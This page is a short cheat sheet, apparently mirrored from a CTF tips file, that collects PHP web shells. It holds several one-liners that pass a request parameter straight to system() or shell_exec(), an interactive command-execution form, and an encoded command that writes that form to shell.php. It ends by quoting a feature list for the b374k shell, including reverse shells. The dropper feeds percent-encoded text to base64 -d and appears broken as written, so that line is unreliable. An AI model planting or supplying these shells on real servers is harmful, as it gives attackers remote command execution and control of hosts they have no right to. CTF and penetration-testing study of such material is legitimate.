# Web Shells

#### Mirror ChrisPritchard/ctf-writeups/master/TIPS-AND-TRICKS.md

This is a mirror of [GitHub ChrisPritchard/ctf-writeups - TIPS-AND-TRICKS.md](https://github.com/ChrisPritchard/ctf-writeups/blob/master/TIPS-AND-TRICKS.md); the source I found that is very concise and simple. 

PHP one liner:
`<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>`

Tighter: 
`<?php echo shell_exec($_GET['e'].' 2>&1'); ?>`

No quotes:
`<?php system($_GET[1]); ?>`
PHP interactive shell:

```php
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
<script>document.getElementById("cmd").focus();</script>
```

shell above emitted to a file via base64:
```bash
echo %50%47%5a%76%63%6d%30%67%62%57%56%30%61%47%39%6b%50%53%4a%48%52%56%51%69%49%47%35%68%62%57%55%39%49%6a%77%2f%63%47%68%77%49%47%56%6a%61%47%38%67%59%6d%46%7a%5a%57%35%68%62%57%55%6f%4a%46%39%54%52%56%4a%57%52%56%4a%62%4a%31%42%49%55%46%39%54%52%55%78%47%4a%31%30%70%4f%79%41%2f%50%69%49%2b%43%6a%78%70%62%6e%42%31%64%43%42%30%65%58%42%6c%50%53%4a%55%52%56%68%55%49%69%42%75%59%57%31%6c%50%53%4a%6a%62%57%51%69%49%47%6c%6b%50%53%4a%6a%62%57%51%69%49%48%4e%70%65%6d%55%39%49%6a%67%77%49%6a%34%4b%50%47%6c%75%63%48%56%30%49%48%52%35%63%47%55%39%49%6c%4e%56%51%6b%31%4a%56%43%49%67%64%6d%46%73%64%57%55%39%49%6b%56%34%5a%57%4e%31%64%47%55%69%50%67%6f%38%4c%32%5a%76%63%6d%30%2b%43%6a%78%77%63%6d%55%2b%43%6a%77%2f%63%47%68%77%43%69%41%67%49%43%42%70%5a%69%68%70%63%33%4e%6c%64%43%67%6b%58%30%64%46%56%46%73%6e%59%32%31%6b%4a%31%30%70%4b%51%6f%67%49%43%41%67%65%77%6f%67%49%43%41%67%49%43%41%67%49%48%4e%35%63%33%52%6c%62%53%67%6b%58%30%64%46%56%46%73%6e%59%32%31%6b%4a%31%30%70%4f%77%6f%67%49%43%41%67%66%51%6f%2f%50%67%6f%38%4c%33%42%79%5a%54%34%4b%50%48%4e%6a%63%6d%6c%77%64%44%35%6b%62%32%4e%31%62%57%56%75%64%43%35%6e%5a%58%52%46%62%47%56%74%5a%57%35%30%51%6e%6c%4a%5a%43%67%69%59%32%31%6b%49%69%6b%75%5a%6d%39%6a%64%58%4d%6f%4b%54%73%38%4c%33%4e%6a%63%6d%6c%77%64%44%34%3d | base64 -d > shell.php
```
#### b374k shell 

[b374k shell](https://github.com/b374k/b374k) *"This PHP Shell is a useful tool for system or web administrator to do remote management without using cpanel, connecting using ssh, ftp etc. All actions take place within a web browser - Features :
- File manager (view, edit, rename, delete, upload, download, archiver, etc)
- Search file, file content, folder (also using regex)
- Command execution
- Script execution (php, perl, python, ruby, java, node.js, c)
- Give you shell via bind/reverse shell connect
- Simple packet crafter
- Connect to DBMS (mysql, mssql, oracle, sqlite, postgresql, and many more using ODBC or PDO)
- SQL Explorer
- Process list/Task manager
- Send mail with attachment (you can attach local file on server)
- String conversion
- All of that only in 1 file, no installation needed
- Support PHP > 4.3.3 and PHP 5"*


## References

[b374k shell](https://github.com/b374k/b374k)
[GitHub ChrisPritchard/ctf-writeups - TIPS-AND-TRICKS.md](https://github.com/ChrisPritchard/ctf-writeups/blob/master/TIPS-AND-TRICKS.md)